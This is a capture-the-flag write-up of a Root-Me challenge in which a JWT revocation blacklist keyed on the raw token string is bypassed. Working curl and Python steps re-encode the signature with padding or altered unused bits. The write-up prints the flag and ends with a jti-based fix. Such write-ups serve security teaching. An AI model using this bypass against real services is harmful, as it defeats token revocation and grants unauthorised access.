# Root-Me — Web-Server / JWT - Revoked token (ch63)

- **Target:** http://challenge01.root-me.org/web-serveur/ch63/
- **Class:** JWT — broken revocation (blacklist keyed on the encoded token string)
- **Author / date:** ArnC, 20 March 2020
- **Goal:** get access to the `/admin` endpoint

## Flag

```
Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld
```

Byte-exact (`od` dump, no trailing whitespace):

```
D o _ n 0 t _ r 3 v 0 k e _ 3 n c 0 d 3 d T o k e n z _ M a m 3 n e - U s 3 _ t h 3 _ J T I _ f 1 e l d
```

The flag text *is* the fix: **"Do not revoke encoded tokens, use the JTI field"**.

## Endpoints

| Method | Path | Behaviour |
|---|---|---|
| POST | `/web-serveur/ch63/login` | JSON `{"username","password"}`, must be `admin`/`admin` → HS256 access token, 3 min TTL |
| GET | `/web-serveur/ch63/admin` | `@jwt_required`, returns the flag **unless the raw token string is in the blacklist** |

## The vulnerable code

```python
blacklist = set()
lock = threading.Lock()

def delete_expired_tokens():
    with lock:
        to_remove = set()
        global blacklist
        for access_token in blacklist:
            try:
                jwt.decode(access_token, app.config['JWT_SECRET_KEY'], algorithm='HS256')
            except:
                to_remove.add(access_token)
        blacklist = blacklist.difference(to_remove)

@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    ...
    access_token = create_access_token(identity=username,
                                       expires_delta=datetime.timedelta(minutes=3))
    with lock:
        blacklist.add(access_token)          # <-- blacklist stores the ENCODED STRING
    return jsonify({'access_token': access_token}), 200

@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required()
def protected():
    access_token = request.headers.get("Authorization").split()[1]
    with lock:
        if access_token in blacklist:        # <-- string membership test
            return jsonify({"msg": "Token is revoked"})
        else:
            return jsonify({'Congratzzzz!!!_flag:': FLAG})
```

The design flaw is one line: the blacklist is a `set` of **token strings**, and the
`/admin` check is a raw **string comparison**. Revocation therefore means "this exact
byte sequence is banned" — not "this token is banned".

But a JWT is not a canonical byte sequence. The **signature segment is base64url-decoded,
not compared**, so any encoding of the same signature bytes is equally valid, and the
signature itself is verified over `header.payload` only. So we can produce *different
strings* that are the *same token*.

Note also that the deployment enforces JWT properly — the source listing shows a bare
`@jwt_required`, but the live service returns flask-jwt-extended's standard
`422 {"msg":"Signature verification failed"}`, so the real decorator is `@jwt_required()`.

## Step 1 — Reproduce the block

```bash
B="http://challenge01.root-me.org/web-serveur/ch63"
T=$(curl -s -X POST -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"admin"}' "$B/login" \
    | python -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

curl -s -H "Authorization: Bearer $T" "$B/admin"
# -> {"msg":"Token is revoked"}
```

Decoded token:

```json
{"typ":"JWT","alg":"HS256"}
{"iat":1791480308,"nbf":1791480308,"jti":"98712229-c7a0-4377-8684-c28e5cb506b4",
 "exp":1791480488,"identity":"admin","fresh":false,"type":"access"}
```

## Step 2 — Same token, different string

Two independent ways; both work.

### A. Append `=` padding to the signature segment

HS256 signatures are 32 bytes → 43 base64url characters with the padding stripped.
PyJWT's `base64url_decode()` re-pads only when `len % 4 != 0`; 44 chars (43 + `=`) is
already a multiple of 4, so it decodes straight to the same 32 bytes.

```bash
curl -s -H "Authorization: Bearer ${T}=" "$B/admin"
# -> {"Congratzzzz!!!_flag:":"Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld"}
```

### B. Non-canonical last character of the signature

43 chars encode 30 bytes (40 chars) plus 2 bytes (3 chars = 18 bits). The **low 2 bits of
the final character are unused**, so mutating them changes the string while decoding to
byte-identical output:

```python
ALPH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
h, p, sig = T.split(".")
i = ALPH.index(sig[-1])                 # index 20 -> 'U', high 4 bits = 20
for k in (1, 2, 3):
    variant = f"{h}.{p}.{sig[:-1]}{ALPH[(i & ~3) | k]}"   # 'V', 'W', 'X'
```

## Results

| Variant | Token string | `/admin` |
|---|---|---|
| raw token from login | `…ZliU` | `{"msg":"Token is revoked"}` |
| signature + `=` | `…ZliU=` | **flag** |
| last char `k=0` → `U` | `…ZliU` (identical) | `{"msg":"Token is revoked"}` |
| last char `k=1` → `V` | `…ZliV` | **flag** |
| last char `k=2` → `W` | `…ZliW` | **flag** |
| last char `k=3` → `X` | `…ZliX` | **flag** |

The `k=0` row is the built-in control: it regenerates the *exact* blacklisted string and
is correctly revoked, while `k=1..3` — same signature bytes, same claims — are accepted.

## Negative controls

| # | Probe | Expected | Observed |
|---|---|---|---|
| 1 | raw login token | revoked | `{"msg":"Token is revoked"}` |
| 2 | last char `k=0` (byte-identical to blacklisted) | revoked | `{"msg":"Token is revoked"}` |
| 3 | last char with **high** bits changed (`(i+4) % 64`) | bad signature | `422 Signature verification failed` |
| 4 | header segment re-encoded | bad signature | `422 Signature verification failed` |
| 5 | empty signature | bad signature | `422 Signature verification failed` |
| 6 | signature `AAAA` | bad signature | `422 Signature verification failed` |

Controls 3–6 prove the signature check is genuinely enforced — the bypass is *not* a
missing verification, it is a canonicalisation mismatch. Control 3 is the sharpest:
touching the *used* bits breaks the signature, touching only the *unused* bits does not.

Reproduced across 3 fresh logins: raw token always `Token is revoked`, `+ "="` variant
always returns the flag.

## Root cause

1. **Revocation keyed on the encoded artefact, not the token identity.** A JWT has many
   valid encodings. Storing the string means the blacklist only catches the exact bytes
   the server happened to emit.
2. **String comparison instead of claim comparison.** `access_token in blacklist` compares
   text. The security-relevant question is "has *this token* been revoked?", which is a
   question about a claim, not about a string.
3. **JWT gives you the right primitive and it was ignored.** Every token here already
   carries a `jti` (JWT ID) — a unique identifier. That is exactly what a revocation list
   should key on. The flag spells this out.

## Fix

Key the blacklist on `jti`, not on the token:

```python
@app.route('/web-serveur/ch63/login', methods=['POST'])
def login():
    ...
    access_token = create_access_token(identity=username,
                                       expires_delta=datetime.timedelta(minutes=3))
    # store the token ID, not the token
    decoded = decode_token(access_token)
    with lock:
        blacklist.add(decoded["jti"])
    return jsonify({'access_token': access_token}), 200

@app.route('/web-serveur/ch63/admin', methods=['GET'])
@jwt_required()
def protected():
    jti = get_jwt()["jti"]           # from the verified token, not the raw header
    with lock:
        if jti in blacklist:
            return jsonify({"msg": "Token is revoked"}), 401
    return jsonify({'Congratzzzz!!!_flag:': FLAG})
```

Also worth doing:

- **Never parse auth state out of the raw header string.** `request.headers[...].split()[1]`
  is brittle; use the library's verified view (`get_jwt()`), which also guarantees the
  `jti` you check belongs to a signature-verified token.
- **Return 401, not 200, for a revoked token** — the current code signals success at the
  HTTP layer while returning a revocation message.
- **Normalise the comparison anyway** if a string blacklist must be kept (canonicalise the
  signature padding before storing), but this is a workaround, not a fix.
- Long term, prefer a stateless design (short TTLs + refresh tokens) or key revocation on
  `jti` in a shared store with the same TTL as the token.

## Generalisation

Any "deny-list the artefact" pattern has this shape, not just JWTs:

- Revoking a **session cookie** by its literal value while the framework accepts
  equivalent encodings
- Blacklisting a **hash/signature string** that has multiple valid textual forms
  (base64 padding, case in hex, JSON key order, whitespace)
- Banning an **email/username** by exact string match when the backend normalises it
  (`Admin` vs `admin`, Unicode NFC/NFD)

The rule: revocation and rate-limiting must key on a **canonical identity**, and the
comparison must happen after parsing/normalisation, never on the raw wire format.
